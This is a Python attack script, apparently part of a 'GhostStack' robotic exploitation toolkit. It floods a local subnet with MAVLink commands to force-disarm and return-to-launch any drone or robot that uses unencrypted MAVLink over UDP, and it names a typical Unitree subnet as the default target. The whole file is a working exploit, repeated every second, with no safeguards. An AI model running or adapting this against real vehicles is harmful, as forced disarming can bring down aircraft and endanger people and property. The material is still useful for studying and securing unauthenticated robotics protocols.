from pymavlink import mavutil
import socket
import time
import sys

# GhostStack: Robotic Exploitation - MAVLink "Kill Switch"
#
# Broadcasts critical commands (DISARM, RTL, LAND) to any MAVLink 
# system responding on the local network. 
#
# Target: Autonomous systems using unencrypted MAVLink over UDP.

def broadcast_kill_switch(interface="192.168.123.255", port=14550):
    """
    Broadcasts 'DISARM' and 'RETURN TO LAUNCH' to the entire subnet.
    Default Unitree subnet is often 192.168.123.x
    """
    print(f"[*] Initializing MAVLink Kill-Switch on {interface}:{port}...")
    
    try:
        # Create a MAVLink connection that supports broadcasting
        # 'out' sends to a specific address, 'udpout' is more standard for broadcast
        mav = mavutil.mavlink_connection(f'udpout:{interface}:{port}', broadcast=True)
        
        while True:
            print(f"[!] BROADCASTING: DISARM & RETURN_TO_LAUNCH...")
            
            # 1. DISARM Command
            mav.mav.command_long_send(
                0, 0, # Target Sys/Comp (0 = broadcast)
                mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
                0, # Confirmation
                0, # param1: 0=disarm
                21196, # param2: force
                0, 0, 0, 0, 0
            )
            
            # 2. RETURN_TO_LAUNCH Command
            mav.mav.command_long_send(
                0, 0,
                mavutil.mavlink.MAV_CMD_NAV_RETURN_TO_LAUNCH,
                0, 0, 0, 0, 0, 0, 0, 0
            )

            time.sleep(1) # Repeat every second to ensure reception
            
    except KeyboardInterrupt:
        print("\n[*] Kill-Switch deactivated.")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    target_ip = sys.argv[1] if len(sys.argv) > 1 else "192.168.123.255"
    broadcast_kill_switch(target_ip)
